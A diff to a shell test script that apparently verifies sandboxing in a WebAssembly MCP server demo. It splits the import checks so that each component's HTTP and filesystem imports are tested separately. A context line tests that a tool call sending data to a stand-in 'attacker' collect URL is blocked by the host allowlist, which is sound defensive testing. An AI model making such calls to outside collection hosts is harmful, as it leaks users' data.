@@ -400,13 +400,16 @@ expect "$f" 'mcp call favorite_talk {"id":1}' ok '"favorite":true'
 expect "$f" 'mcp --server http://talks.mock-sites.svc/talks tools' access-denied "talks.mock-sites.svc: $DENIED_HOST"
 expect "$f" 'mcp call import_talks {"url":"http://attacker.mock-sites.svc/collect"}' tool-failed \
   'attacker.mock-sites.svc: this server may not reach that host (not in its allowedHosts)'
-present "$f" 'import wasi:http/client@0.3.0' 'the MCP server imports an HTTP client'
-present "$f" 'import wasi:filesystem/types' 'the talks service imports a filesystem'
-CHECKED=$((CHECKED + 1))
+# Each component's own imports: the MCP server's, then the talks service's.
 mcp_imports=$(sed -n "/talks_mcp.wasm/,/talks_api.wasm/p" "$f")
+api_imports=$(sed -n '/talks_api.wasm/,$p' "$f")
+CHECKED=$((CHECKED + 1))
+case "$mcp_imports" in *'import wasi:http/client@0.3.0'*) ;; *) fail "$f" 'the MCP server imports an HTTP client' present absent ;; esac
+CHECKED=$((CHECKED + 1))
 case "$mcp_imports" in *'import wasi:filesystem'*) fail "$f" 'the MCP server imports no filesystem' absent present ;; esac
 CHECKED=$((CHECKED + 1))
-api_imports=$(sed -n '/talks_api.wasm/,$p' "$f")
+case "$api_imports" in *'import wasi:filesystem/types'*) ;; *) fail "$f" 'the talks service imports a filesystem' present absent ;; esac
+CHECKED=$((CHECKED + 1))
 case "$api_imports" in *'import wasi:http/client'*) fail "$f" 'the talks service imports no HTTP client' absent present ;; esac
 
 f=$(OUT steps/04-github)
